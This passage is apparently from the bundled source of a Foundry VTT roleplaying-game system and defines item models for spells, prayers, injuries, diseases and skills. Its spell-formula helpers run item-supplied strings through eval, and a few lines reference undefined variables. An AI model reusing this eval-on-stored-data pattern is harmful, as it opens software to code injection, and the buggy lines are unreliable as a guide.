        return super.shouldTransferEffect(effect) && (!effect.applicationData.equipTransfer || this.isEquipped)
    }


    chatData() {
      let properties = [
        `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} GC, ${this.price.ss || 0} SS, ${this.price.bp || 0} BP`,
        `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
        `<b>${game.i18n.localize("Availability")}</b>: ${game.wfrp4e.config.availability[this.availability.value] || "-"}`
      ];
  
      properties.push(`<b>${game.i18n.localize("Wearable")}</b>: ${(this.wearable.value ? game.i18n.localize("Yes") : game.i18n.localize("No"))}`);
      properties.push(`<b>${game.i18n.localize("ITEM.CountOwnerEnc")}</b>: ${(this.countEnc.value ? game.i18n.localize("Yes") : game.i18n.localize("No"))}`);
      return properties;
    }

}

let fields$i = foundry.data.fields;

class LocationalItemModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.prompt = new fields$i.BooleanField();
        schema.location = new fields$i.SchemaField({
            value: new fields$i.StringField(),
            key: new fields$i.StringField(),
        });
        return schema;
    }


    async preCreateData(data, options, user) {
        let preCreateData = await super.preCreateData(data, options, user);

        if (this.parent.isOwned)
        {
            this.checkSourceTest(); // If this item has a source test, use that location
            
            let location = this.location.key;
            if (!location && this.prompt) {
                await this.promptLocation();
            }
            else if (location && !options.skipLocationValue) // The location key might already be defined, but not the display value, so set that accordingly
            {
                this.updateSource({"location.value" : game.wfrp4e.config.locations[location]});
            }
        }
        return preCreateData;
    }

    checkSourceTest()
    {
        let sourceMessageId = this.parent.getFlag("wfrp4e", "sourceMessageId");
        let actor = this.parent?.actor;
        
        if (sourceMessageId && actor)
        {

            let message = game.messages.get(sourceMessageId);
            // Might come from single or opposed test
            let test = message.getTest(); 
            let opposed = message.getOpposedTest();

            if (test)
            {
                this.updateSource({"location.key" : actor.convertHitLoc(test.result.hitloc.result)});
            }
            else if (opposed)
            {
                // Opposed test already compute the "true" hit location
                this.updateSource({"location.key" : opposed.result.hitloc.value});
            }
        }
    }

    async promptLocation() {
        let location = await Dialog.wait({
            title: game.i18n.localize("Location"),
            content: "Choose Location",
            buttons: {
                l: {
                    label: `${game.i18n.localize("Left")} ${this.location.value}`,
                    callback: () => {
                        return "l";
                    }
                },
                r: {
                    label: `${game.i18n.localize("Right")} ${this.location.value}`,
                    callback: () => {
                        return "r";
                    }
                }
            }
        });


        let displayLocation = this.location.value;

        if (location == "l") {
            displayLocation = `${game.i18n.localize("Left")} ${this.location.value}`;
        }
        if (location == "r") {
            displayLocation = `${game.i18n.localize("Right")} ${this.location.value}`;
        }

        this.parent.updateSource({ "system.location": { key: location + this.location.value, value: displayLocation } });
    }

    usesLocation(weapon) {
        let actor = this.parent?.actor;
        if (!this.location.key || !actor || !weapon.isEquipped) {
            return false;
        }
        
        // At this point, we know weapon is equipped

        if (weapon.system.twohanded.value)
        {
            return true;
        }

        if (actor.mainArmLoc == this.normalizeLocation(this.location.key)) {
            return !weapon.system.offhand.value // If not in offhand, it is in the main hand
        }
        else if (actor.secondaryArmLoc == this.normalizeLocation(this.location.key)) {
            return weapon.system.offhand.value
        }
    }

    // e.g. converts rHand to rArm
    normalizeLocation(key)
    {
        if (key[0] == "r")
        {
            return "rArm";
        }
        else if (key[0] == "l")
        {
            return "lArm";
        }
    }

    get weaponsAtLocation() {
        return this.parent?.actor?.itemTypes.weapon.filter(weapon => this.usesLocation(weapon)) || []
    }
}

let fields$h = foundry.data.fields;

class CriticalModel extends LocationalItemModel {
    // allowedConditions = ["bleeding", "stunned", "blinded", "deafened", "incapacitated", "prone", "stunned", "fatigued"];
    // allowedEffectApplications = ["document"];
    // effectApplicationOptions = {documentType : "Actor"};

    static defineSchema() {
        let schema = super.defineSchema();
        schema.wounds = new fields$h.SchemaField({
            value: new fields$h.StringField(),
        });

        schema.modifier = new fields$h.SchemaField({
            value: new fields$h.StringField(),
        });
        return schema;
    }

    createChecks(data, options, user) {
        if (this.parent.actor && this.parent.actor.type != "vehicle") 
        {
            let actor = this.parent.actor;
            try {

                let newWounds;
                let appliedWounds = Number.parseInt(this.wounds.value);
                if (Number.isInteger(appliedWounds)) 
                {
                    ui.notifications.notify(`${this.wounds.value} ${game.i18n.localize("CHAT.CriticalWoundsApplied")} ${actor.name}`);
                    newWounds = actor.status.wounds.value - appliedWounds;
                    if (newWounds < 0) 
                    {
                        newWounds = 0;
                    }
                } 
                else if (this.wounds.value.toLowerCase() == "death") 
                {
                    newWounds = 0;
                }

                if (game.combat && game.user.isGM) {
                    let minorInfections = game.combat.getFlag("wfrp4e", "minorInfections") || [];
                    minorInfections.push(actor.name);
                    game.combat.setFlag("wfrp4e", "minorInfections", null).then(c => game.combat.setFlag("wfrp4e", "minorInfections", minorInfections));
                }
                actor.update({ "system.status.wounds.value": newWounds });
            }
            catch (e) {
                console.error(`createChecks from ${this.parent?.actor?.name} threw error: ${e}.\n Arguments:`, this);
            }
        }
    }

    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties.push(`<b>${game.i18n.localize("Wounds")}</b>: ${this.wounds.value}`);
        if (this.modifier.value)
          data.properties.push(`<b>${game.i18n.localize("Modifier")}</b>: ${this.modifier.value}`);
        return data;
      }

      chatData() {
        let properties = [];
        properties.push(`<b>${game.i18n.localize("Wounds")}</b>: ${this.wounds.value}`);
        properties.push(`<b>${game.i18n.localize("Location")}</b>: ${this.location.value}`);
        if (this.modifier.value)
          properties.push(`<b>${game.i18n.localize("Modifier")}</b>: ${this.modifier.value}`);
        return properties;
      }

}

let fields$g = foundry.data.fields;

/**
 * Represents an Item used by both Patrons and Characters/NPCs
 */
class DiseaseModel extends BaseItemModel {

  static defineSchema() {
    let schema = super.defineSchema();
    schema.contraction = new fields$g.SchemaField({
      value: new fields$g.StringField(),
    });

    schema.incubation = new fields$g.SchemaField({
      value: new fields$g.StringField(),
      unit: new fields$g.StringField(),
    });

    schema.duration = new fields$g.SchemaField({
      value: new fields$g.StringField(),
      unit: new fields$g.StringField(),
      active: new fields$g.BooleanField(),
    });

    schema.symptoms = new fields$g.SchemaField({
      value: new fields$g.StringField(),
    });

    schema.diagnosed = new fields$g.BooleanField({initial: false});

    schema.permanent = new fields$g.SchemaField({
      value: new fields$g.StringField(),
    });

    return schema;
  }

  async expandData(htmlOptions) {
    let data = await super.expandData(htmlOptions);
    data.properties.push(`<b>${game.i18n.localize("Contraction")}:</b> ${this.contraction.value}`);
    data.properties.push(`<b>${game.i18n.localize("Incubation")}:</b> ${this.incubation.value} ${this.incubation.unit}`);
    data.properties.push(`<b>${game.i18n.localize("Duration")}:</b> ${this.duration.value} ${this.duration.unit}`);
    data.properties = data.properties.concat(this.parent.effects.map(i => i = "<a class ='symptom-tag'><i class='fas fa-user-injured'></i> " + i.name.trim() + "</a>").join(", "));

    if (this.permanent.value)
      data.properties.push(`<b>${game.i18n.localize("Permanent")}:</b> ${this.permanent.value}`);

    return data;
  }

  chatData() {
    let properties = [];
    properties.push(`<b>${game.i18n.localize("Contraction")}:</b> ${this.contraction.value}`);
    properties.push(`<b>${game.i18n.localize("Incubation")}:</b> <a class = 'chat-roll'><i class='fas fa-dice'></i> ${this.incubation.value}</a>`);
    properties.push(`<b>${game.i18n.localize("Duration")}:</b> <a class = 'chat-roll'><i class='fas fa-dice'></i> ${this.duration.value}</a>`);
    properties.push(`<b>${game.i18n.localize("Symptoms")}:</b> ${(this.symptoms.value.split(",").map(i => i = "<a class ='symptom-tag'><i class='fas fa-user-injured'></i> " + i.trim() + "</a>")).join(", ")}`);

    if (this.permanent.value)
      properties.push(`<b>${game.i18n.localize("Permanent")}:</b> ${this.permanent.value}`);

    return properties;
  }

  get show()
  {
    return this.diagnosed || game.user.isGM
  }

  shouldTransferEffect(effect)
  {
    return this.duration.active === true;
  }
}

let fields$f = foundry.data.fields;

class InjuryModel extends LocationalItemModel 
{
    // allowedConditions = ["bleeding", "stunned", "blinded", "deafened", "incapacitated", "prone", "stunned"];
    // allowedEffectApplications = ["document"];
    // effectApplicationOptions = {documentType : "Actor"};

    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.penalty = new fields$f.SchemaField({
            value : new fields$f.StringField(),
        });
        schema.duration = new fields$f.SchemaField({
            value : new fields$f.StringField(),
            active : new fields$f.BooleanField(),
            permanent : new fields$f.BooleanField(),
        });
        return schema;
    }

    chatData() {
        let properties = [];
        properties.push(`<b>${game.i18n.localize("Location")}</b>: ${this.location.value}`);
        if (this.penalty.value)
          properties.push(`<b>${game.i18n.localize("Penalty")}</b>: ${this.penalty.value}`);
        return properties;
      }

}

let fields$e = foundry.data.fields;

class MoneyModel extends PhysicalItemModel
{
    static defineSchema() 
    {
        // Patron Fields
        let schema = super.defineSchema();

        schema.coinValue = new fields$e.SchemaField({
            value : new fields$e.NumberField({initial: 1}),
        });

        return schema;
    }

    async expandData() {
        let data = await super.expandData(htmlOptions);
        data.properties = [`${game.i18n.localize("ITEM.PenniesValue")}: ${this.coinValue.value}`];
        return data;
      }

      chatData() {
        let properties = [
          `<b>${game.i18n.localize("ITEM.PenniesValue")}</b>: ${this.coinValue.value}`,
          `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
        ];
        return properties;
      }
}

let fields$d = foundry.data.fields;

class MutationModel extends BaseItemModel
{
    static defineSchema() 
    {
        // Patron Fields
        let schema = super.defineSchema();
        schema.mutationType = new fields$d.SchemaField({
            value : new fields$d.StringField(),
        });
        
        schema.modifier = new fields$d.SchemaField({
            value : new fields$d.StringField(),
        });

        schema.modifiesSkills = new fields$d.SchemaField({
            value : new fields$d.BooleanField(),
        });

        return schema;
    }


    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties.push(game.wfrp4e.config.mutationTypes[this.mutationType.value]);
        if (this.modifier.value)
          data.properties.push(this.modifier.value);
        return data;
      }

      chatData() {
        let properties = [
          `<b>${game.i18n.localize("ITEM.MutationType")}</b>: ${game.wfrp4e.config.mutationTypes[this.mutationType.value]}`,
        ];
        if (this.modifier.value)
          properties.push(`<b>${game.i18n.localize("Modifier")}</b>: ${this.modifier.value}`);
        return properties;
      }
    
}

let fields$c = foundry.data.fields;

class OvercastItemModel extends BaseItemModel {


  static defineSchema() 
  {
      let schema = super.defineSchema();
      // Embedded Data Models?
      schema.overcast = new fields$c.SchemaField({
          enabled : new fields$c.BooleanField(),
          label : new fields$c.StringField(),
          valuePerOvercast : new fields$c.SchemaField({
               type : new fields$c.StringField(),
               value : new fields$c.NumberField({initial : 1}),
               SL : new fields$c.BooleanField(),
               additional  : new fields$c.StringField(),
               characteristic  : new fields$c.StringField(),
               bonus : new fields$c.BooleanField(),
          }),
          initial : new fields$c.SchemaField({
              type : new fields$c.StringField(),
              value : new fields$c.NumberField({initial : 1}),
              SL : new fields$c.BooleanField(),
              additional  : new fields$c.StringField(),
              characteristic  : new fields$c.StringField(),
              bonus : new fields$c.BooleanField(),
          })
      });
      return schema;
  }

  get isMagical() {
    return true;
  }



    /**
   * Turns a formula into a processed string for display
   * 
   * Processes damage formula based - same as calculateSpellAttributes, but with additional
   * consideration to whether its a magic missile or not
   * 
   * @param   {String}  formula         Formula to process - "Willpower Bonus + 4" 
   * @param   {boolean} isMagicMissile  Whether or not it's a magic missile - used in calculating additional damage
   * @returns {String}  Processed formula
   */
      computeSpellDamage(formula, isMagicMissile) {
      try {
      if (formula) {
          formula = formula.toLowerCase();

          if (isMagicMissile) {// If it's a magic missile, damage includes willpower bonus
          formula += "+" + this.parent.actor.characteristics["wp"].bonus;
          }

          let labels = game.wfrp4e.config.characteristics;
          let sortedCharacteristics = Object.entries(this.parent.actor.characteristics).sort((a,b) => -1 * labels[a[0]].localeCompare(labels[b[0]]));
          sortedCharacteristics.forEach(arr => {
          let ch = arr[0];
          // Handle characteristic with bonus first
          formula = formula.replace(game.wfrp4e.config.characteristicsBonus[ch].toLowerCase(), this.parent.actor.characteristics[ch].bonus);
          formula = formula.replace(game.wfrp4e.config.characteristics[ch].toLowerCase(), this.parent.actor.characteristics[ch].value);
          });

          return (0, eval)(formula);
      }
      return 0;
      }
      catch (e) {
        console.error(`Spell from ${this.parent?.actor?.name} threw error: ${e}.\n Arguments:`, this, formula);
        if (ui.notifications) {
          throw ui.notifications.error(game.i18n.format("ERROR.ParseSpell"))
        }
      }
  }



  // Don't really like this here as it uses assumed subclass data, but it'll do for now
  computeOvercastingData() {
    let usage = {
      damage: undefined,
      range: undefined,
      duration: undefined,
      target: undefined,
      other: undefined,
    };

    let damage = this.Damage;
    let target = this.Target;
    let duration = this.Duration;
    let range = this.Range;

    if (this.magicMissile?.value) {
      usage.damage = {
        label: game.i18n.localize("Damage"),
        count: 0,
        initial: parseInt(damage) || damage,
        current: parseInt(damage) || damage,
        available: false
      };
    }
    if (parseInt(target) && !includesMaximum(target)) {
      usage.target = {
        label: game.i18n.localize("Target"),
        count: 0,
        AoE: false,
        initial: parseInt(target) || target,
        current: parseInt(target) || target,
        unit: "",
        available: false
      };
    }
    else if (target?.includes("AoE") && !includesMaximum(target)) {
      let aoeValue = target.substring(target.indexOf("(") + 1, target.length - 1);
      usage.target = {
        label: game.i18n.localize("AoE"),
        count: 0,
        AoE: true,
        initial: parseInt(aoeValue) || aoeValue,
        current: parseInt(aoeValue) || aoeValue,
        unit: aoeValue.split(" ")[1],
        available: false
      };
    }
    if (parseInt(duration) && !includesMaximum(duration)) {
      usage.duration = {
        label: game.i18n.localize("Duration"),
        count: 0,
        initial: parseInt(duration) || duration,
        current: parseInt(duration) || duration,
        unit: duration.split(" ")[1],
        available: false
      };
    }
    if (parseInt(range) && !includesMaximum(range)) {
      usage.range = {
        label: game.i18n.localize("Range"),
        count: 0,
        initial: parseInt(range) || aoeValue,
        current: parseInt(range) || aoeValue,
        unit: range.split(" ")[1],
        available: false
      };
    }

    if (this.overcast?.enabled) {
      let other = {
        label: this.overcast.label,
        count: 0
      };


      // Set initial overcast option to type assigned, value is arbitrary, characcteristics is based on actor data, SL is a placeholder for tests
      if (this.overcast.initial.type == "value") {
        other.initial = parseInt(this.overcast.initial.value) || 0;
        other.current = parseInt(this.overcast.initial.value) || 0;
      }
      else if (this.overcast.initial.type == "characteristic") {
        let char = this.parent.actor.characteristics[this.overcast.initial.characteristic];

        if (this.overcast.initial.bonus)
          other.initial = char.bonus;
        else
          other.initial = char.value;

        other.current = other.initial;
      }
      else if (this.overcast.initial.type == "SL") {
        other.initial = "SL";
        other.current = "SL";
      }

      // See if overcast increments are also based on characteristics, store that value so we don't have to look it up in the roll class
      if (this.overcast.valuePerOvercast.type == "characteristic") {
        let char = this.parent.actor.characteristics[this.overcast.valuePerOvercast.characteristic];

        if (this.overcast.valuePerOvercast.bonus)
          other.increment = char.bonus;
        else
          other.increment = char.value;

        //other.increment = other.initial;
      }

      usage.other = other;
    }

    this.overcast.usage = usage;

    // Perhaps not the best implementation, but if a spell range (or other) says "maximum", don't allow overcasting
    function includesMaximum(string) {
      return string.toLowerCase().includes(game.i18n.localize("ITEM.Maximum").toLowerCase());
    }

  }



  /**
   * Turns a formula into a processed string for display
   * 
   * Turns a spell attribute such as "Willpower Bonus Rounds" into a more user friendly, processed value
   * such as "4 Rounds". If the aoe is checked, it wraps the result in AoE (Result).
   * 
   * @param   {String}  formula   Formula to process - "Willpower Bonus Rounds" 
   * @param   {boolean} aoe       Whether or not it's calculating AoE (changes string return)
   * @returns {String}  formula   processed formula
   */
  computeSpellPrayerFormula(type, aoe = false, formulaOverride) {
    let formula = formulaOverride || this[type]?.value;
    try {
      if (Number.isNumeric(formula))
        return formula

      formula = formula.toLowerCase();

      // Do not process these special values
      if (formula != game.i18n.localize("You").toLowerCase() && formula != game.i18n.localize("Special").toLowerCase() && formula != game.i18n.localize("Instant").toLowerCase()) {
        // Iterate through characteristics
        let labels = game.wfrp4e.config.characteristics;
        let sortedCharacteristics = Object.entries(this.parent.actor.characteristics).sort((a,b) => -1 * labels[a[0]].localeCompare(labels[b[0]]));
        sortedCharacteristics.forEach(arr => {
          let ch = arr[0];
          // Handle characteristic with bonus first
          formula = formula.replace(game.wfrp4e.config.characteristicsBonus[ch].toLowerCase(), this.parent.actor.characteristics[ch].bonus);
          formula = formula.replace(game.wfrp4e.config.characteristics[ch].toLowerCase(), this.parent.actor.characteristics[ch].value);
        });

        let total = 0;
        let i = 0;
        let s = formula;
        for (; i < s.length; i++) {
          if (!(!isNaN(parseInt(s[i])) || s[i] == ' ' || s[i] == '+' || s[i] == '-' || s[i] == '*' || s[i] == '/')) {
            break;
          }
        }
        if (i > 0) {
          if (i != s.length) {
            total = (0, eval)(s.substr(0, i - 1)) || "";
            formula = total.toString() + " " + s.substr(i).trim();
          } else {
            total = (0, eval)(s) || "";
            formula = total.toString();
          }
        }

        // If AoE - wrap with AoE ( )
        if (aoe)
          formula = "AoE (" + formula.capitalize() + ")";
      }
      return formula.capitalize();
    }
    catch (e) {
      console.error(`computeSpellPrayerFormula from ${this.parent?.actor?.name} threw error: ${e}.\n Arguments:`, this, formula);
      return 0;
    }
  }
}

let fields$b = foundry.data.fields;

class PrayerModel extends OvercastItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();

        schema.type = new fields$b.SchemaField({
            value : new fields$b.StringField(),
        });
        schema.god = new fields$b.SchemaField({
            value : new fields$b.StringField(),
        });             
        schema.range = new fields$b.SchemaField({
            value : new fields$b.StringField(),
        });
        schema.target = new fields$b.SchemaField({
            value : new fields$b.StringField(),
            aoe : new fields$b.BooleanField(),
            extendableAoE : new fields$b.BooleanField(),
        });
        schema.duration = new fields$b.SchemaField({
            value : new fields$b.StringField(),
            extendable : new fields$b.BooleanField(),
        });
        schema.damage = new fields$b.SchemaField({
            dice : new fields$b.StringField(),
            value : new fields$b.StringField(),
            addSL : new fields$b.BooleanField(),
        });
        return schema;
    }

    get Target() {
        return this.computeSpellPrayerFormula("target", this.target.aoe)
      }


    get Duration() {
      let duration = this.computeSpellPrayerFormula("duration", this.range?.aoe);
      return duration
    }

      get Range() {
        return this.computeSpellPrayerFormula("range")
    }

    get Damage() {
        return parseInt(this.computeSpellDamage(this.damage.value, false) || 0)
      }

      get DamageString() {
        let string = this.Damage;
    
        if (this.damage.dice)
          string += `+ ${this.damage.dice}`;

        return string
      }
  

    async preCreateData(data, options, user) {
        let preCreateData = await super.preCreateData(data, options, user);

        if (this.parent.isOwned) 
        {
            let actor = this.parent.actor;
            if (actor.type == "character" && this.type.value == "miracle") {
                WFRP_Utility.miracleGainedDialog(this.parent, actor);
            }
        }

        return preCreateData;
    }

    computeOwned()
    {
        super.computeOwned();
        this.computeOvercastingData();
    }

    getSkillToUse(actor) {
      actor = actor || this.parent.actor;
      let skills = actor?.getItemTypes("skill") || [];
      let skill = skills.find(i => i.name.toLowerCase() == game.i18n.localize("NAME.Pray").toLowerCase());
      return skill;
    }


    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties.push(`${game.i18n.localize("Range")}: ${this.Range}`);
        data.properties.push(`${game.i18n.localize("Target")}: ${this.Target}`);
        data.properties.push(`${game.i18n.localize("Duration")}: ${this.Duration}`);
        let damage = this.Damage || "";
        if (this.damage.dice)
          damage += " + " + this.damage.dice;
        if (this.damage.addSL)
          damage += " + " + game.i18n.localize("SL");
        if (this.damage.value)
          data.properties.push(`${game.i18n.localize("Damage")}: ${this.DamageString}`);
        return data;
      }

      chatData() {
        let properties = [];
        properties.push(`<b>${game.i18n.localize("Range")}</b>: ${this.range.value}`);
        properties.push(`<b>${game.i18n.localize("Target")}</b>: ${this.target.value}`);
        properties.push(`<b>${game.i18n.localize("Duration")}</b>: ${this.duration.value}`);
        if (this.damage.value)
          properties.push(`<b>${game.i18n.localize("Damage")}</b>: ${this.damage.value}`);
        return properties;
      }
    
}

foundry.data.fields;

class PsychologyModel extends BaseItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();

        return schema;
    }

    chatData() {
        return [];
      }
}

let fields$a = foundry.data.fields;

class TalentModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.max = new fields$a.SchemaField({
            value: new fields$a.StringField()
        });
        schema.advances = new fields$a.SchemaField({
            value: new fields$a.NumberField({initial : 1, min: 1}),
            force: new fields$a.BooleanField()
        });
        schema.career = new fields$a.SchemaField({
            value: new fields$a.StringField()
        });
        schema.tests = new fields$a.SchemaField({
            value: new fields$a.StringField()
        });
        return schema;
    }

    get Max() {
        switch (this.max.value) // Turn its max value into "numMax", which is an actual numeric value
        {
            case '1':
                return 1;

            case '2':
                return 2;

            case '3':
                return 3;

            case '4':
                return 4;

            case 'none':
                return "-";

            default:
                return this.parent.actor.characteristics[this.max.value].bonus;
        }
    }

    get cost() {
        return (this.Advances + 1) * 100
    }

    get Advances() {
        if (this.parent.isOwned) {
          let talents = this.parent.actor.getItemTypes("talent");
          return talents.filter(i => i.name == this.parent.name).reduce((prev, current) => prev += current.advances.value, 0)
        }
        else {
          return this.advances.value
        }
      }

    computeOwned() {
        this.advances.indicator = this.advances.force;
    }

    _addCareerData(career) {
        if (!career)
            return

        this.advances.career = this;
        this.advances.indicator = this.advances.indicator || !!this.advances.career || false;
    }

    chatData() {
        let properties = [];
        properties.push(`<b>${game.i18n.localize("Max")}: </b> ${game.wfrp4e.config.talentMax[this.max.value]}`);
        if (this.tests.value)
            properties.push(`<b>${game.i18n.localize("Tests")}: </b> ${this.tests.value}`);
        return properties;
    }
}

let fields$9 = foundry.data.fields;

class TrappingModel extends PropertiesMixin$1(PhysicalItemModel)
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.trappingType = new fields$9.SchemaField({
            value: new fields$9.StringField()
        }),
        schema.spellIngredient = new fields$9.SchemaField({
            value: new fields$9.StringField()
        });
        schema.worn = new fields$9.BooleanField();
        return schema;
    }

    get isEquipped() {

        return this.worn
    }

    async preCreateData(data, options, user)
    {
       let preCreateData = await super.preCreateData(data, options, user);

       if (this.trappingType == "clothingAccessories" && this.parent.isOwned && this.parent.actor.type != "character" && this.parent.actor.type != "vehicle")
       {
          foundry.utils.setProperty(preCreateData, "system.worn", true); // TODO: migrate this into a unified equipped property
       }
           
       return preCreateData;
    }

    shouldTransferEffect(effect)
    {
        return super.shouldTransferEffect(effect) && (!effect.applicationData.equipTransfer || this.isEquipped)
    }

    toggleEquip()
    {
        return this.parent.update({"system.worn" : !this.isEquipped})
    }

    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
    
        let itemProperties = this.Qualities.concat(this.Flaws);
        for (let prop of itemProperties)
          data.properties.push("<a class ='item-property'>" + prop + "</a>");
    
        return data;
      }

      chatData() {
        let properties = [
          `<b>${game.i18n.localize("ITEM.TrappingType")}</b>: ${game.wfrp4e.config.trappingCategories[this.trappingType.value]}`,
          `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${this.price.ss || 0} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${this.price.bp || 0} ${game.i18n.localize("MARKET.Abbrev.BP")}`,
          `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
          `<b>${game.i18n.localize("Availability")}</b>: ${game.wfrp4e.config.availability[this.availability.value] || "-"}`
        ];
    
        // Make qualities and flaws clickable
        if (this.qualities.value.length)
          properties.push(`<b>${game.i18n.localize("Qualities")}</b>: ${this.OriginalQualities.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);
    
        if (this.flaws.value.length)
          properties.push(`<b>${game.i18n.localize("Flaws")}</b>: ${this.OriginalFlaws.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);
    
        return properties;
      }

}

let fields$8 = foundry.data.fields;

class SkillModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.advanced = new fields$8.SchemaField({
            value: new fields$8.StringField(),
        });
        schema.grouped = new fields$8.SchemaField({
            value: new fields$8.StringField({ initial: "noSpec" })
        });
        schema.characteristic = new fields$8.SchemaField({
            value: new fields$8.StringField({ initial: "ws" }),
        });
        schema.advances = new fields$8.SchemaField({
            value: new fields$8.NumberField(),
            costModifier: new fields$8.NumberField(),
            force: new fields$8.BooleanField(),
        });
        schema.modifier = new fields$8.SchemaField({
            value: new fields$8.NumberField(),
        });
        schema.total = new fields$8.SchemaField({
            value: new fields$8.NumberField(),
        });
        return schema;
    }

    get cost() {
          return WFRP_Utility._calculateAdvCost(this.advances.value, "skill", this.advances.costModifier)
    }

    get modified() {
        if (this.modifier) {
          if (this.modifier.value > 0)
            return "positive";
          else if (this.modifier.value < 0)
            return "negative"
        }
        return ""
      }
    

    async preUpdateChecks(data) {
        await super.preUpdateChecks(data);

        if (this.parent.isOwned && this.grouped.value == "isSpec" && data.name) {
            this._handleSkillNameChange(data.name);
        }
    }

    computeOwned()
    {
        this.total.value = this.modifier.value + this.advances.value + this.parent.actor.system.characteristics[this.characteristic.value].value;
        this.advances.indicator = this.advances.force;
    }


    _addCareerData(career) {
        if (!career)
          return
          
        this.advances.career = this;
        if (this.advances.value >= career.level.value * 5)
        {
            this.advances.complete = true;
        }
        this.advances.indicator = this.advances.indicator || !!this.advances.career || false;
      }

    // If an owned (grouped) skill's name is changing, change the career data to match
    _handleSkillNameChange(newName) {
        let oldName = this.parent.name;
        let currentCareer = this.parent.actor?.currentCareer;
        if (!currentCareer) 
        {
            return
        }
        else 
        {
            currentCareer.system.changeSkillName(oldName, newName);
        }
    }

    chatData() {
        let properties = [];
        properties.push(this.advanced == "adv" ? `<b>${game.i18n.localize("Advanced")}</b>` : `<b>${game.i18n.localize("Basic")}</b>`);
        return properties;
    }
    
}

let fields$7 = foundry.data.fields;

class SpellModel extends OvercastItemModel {
    static defineSchema() {
        let schema = super.defineSchema();

        schema.lore = new fields$7.SchemaField({
            value: new fields$7.StringField(),
            effectString: new fields$7.StringField(),
        });
        schema.range = new fields$7.SchemaField({
            value: new fields$7.StringField(),
            vortex: new fields$7.BooleanField(),
        });
        schema.target = new fields$7.SchemaField({
            value: new fields$7.StringField(),
            aoe: new fields$7.BooleanField(),
        });
        schema.duration = new fields$7.SchemaField({
            value: new fields$7.StringField(),
            extendable: new fields$7.BooleanField(),
        });
        schema.damage = new fields$7.SchemaField({
            dice: new fields$7.StringField(),
            value: new fields$7.StringField(),
        });
        schema.cn = new fields$7.SchemaField({
            value: new fields$7.NumberField(),
            SL: new fields$7.NumberField(),
        });
        schema.magicMissile = new fields$7.SchemaField({
            value: new fields$7.BooleanField(),
        });
        schema.ritual = new fields$7.SchemaField({
            value: new fields$7.BooleanField(),
            type: new fields$7.StringField(),
            xp: new fields$7.NumberField(),
        });
        schema.memorized = new fields$7.SchemaField({
            value: new fields$7.BooleanField(),
        });
        schema.skill = new fields$7.SchemaField({
            value: new fields$7.StringField(),
        });
        schema.ingredients = new fields$7.ArrayField(new fields$7.StringField());
        schema.currentIng = new fields$7.SchemaField({
            value: new fields$7.StringField(),
        });
        schema.wind = new fields$7.SchemaField({
            value: new fields$7.StringField(),
        });
        return schema;
    }

    get ingredient() {
        if (this.currentIng.value)
          return this.parent.actor?.items.get(this.currentIng.value)
      }


      get ingredientList() {
        return this.parent.actor?.getItemTypes("trapping").filter(t => t.trappingType.value == "ingredient" && t.spellIngredient.value == this.parent.id)
      }

      get Target() {
        return this.computeSpellPrayerFormula("target", this.target.aoe)
      }

      get Duration() {
        let duration = this.computeSpellPrayerFormula("duration", this.range?.aoe);
        if (this.duration?.extendable)
          duration += "+";
        return duration
      }

      get Range() {
          return this.computeSpellPrayerFormula("range")
      }

      get Damage() {
        return parseInt(this.computeSpellDamage(this.damage.value, this.magicMissile.value) || 0)
      }    
    
    

    async preCreateData(data, options, user) {
        let preCreateData = await super.preCreateData(data, options, user);

        if (this.parent.isOwned) {
            let actor = this.parent.actor;
            if (actor.type != "character" && actor.type != "vehicle") {
                foundry.utils.setProperty(preCreateData, "system.memorized.value", true);
            }

            if (actor.type == "character" && (this.lore.value == "petty" || this.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty"))) {
                WFRP_Utility.memorizeCostDialog(this.parent, actor);
            }
        }

        return preCreateData;
    }

    computeBase() {
        let lore = foundry.utils.deepClone(game.wfrp4e.config.loreEffects[this.lore.value]);
        if (lore) {
            this.lore.effect = new EffectWfrp4e(lore, { parent: this.parent });
        }
        this._addSpellDescription();
    }

    computeOwned()
    {
        this.cn.value = this.memorized.value ? this.cn.value : this.cn.value * 2;
        if (this.ritual?.value && !this.memorized.value)
        {
          this.cn.value *= 2; // Unmemorized rituals are 4 * CN
        }
        else 
        {
          this.computeOvercastingData();
        }
    }


    getSkillToUse(actor) 
    {
        actor = actor || this.parent.actor;
        let skills = actor?.getItemTypes("skill") || [];
        let skill;
        // Use skill override, if not found, use Language (Magick)
        if (this.skill.value)
        {
            skill = skills.find(i => i.name.toLowerCase() == this.skill.value.toLowerCase());
        }
        if (!skill)
        {
            skill = skills.find(i => i.name.toLowerCase() == `${game.i18n.localize("NAME.Language")} (${game.i18n.localize("SPEC.Magick")})`.toLowerCase());
        }
        return skill
    }

    getOtherEffects()
    {
        return super.getOtherEffects().concat(this.lore.effect || [])
    }

    /**
    * Augments the spell item's description with the lore effect
    * 
    * The spell's lore is added at the end of the spell's description for
    * an easy reminder. However, this causes issues because we don't want
    * the lore to be 'saved' in the description. So we append the lore
    * if it does not already exist
    * 
    * @param {Object} spell 'spell' type item
    */
    _addSpellDescription() {
        let description = this.description.value;
        if (description && description.includes(game.i18n.localize("SPELL.Lore")))
            return description

        // Use lore override if it exists
        if (this.lore.effectString)
            description += `<p>\n\n <b>${game.i18n.localize("SPELL.Lore")}</b> ${this.lore.effectString}<p>`;
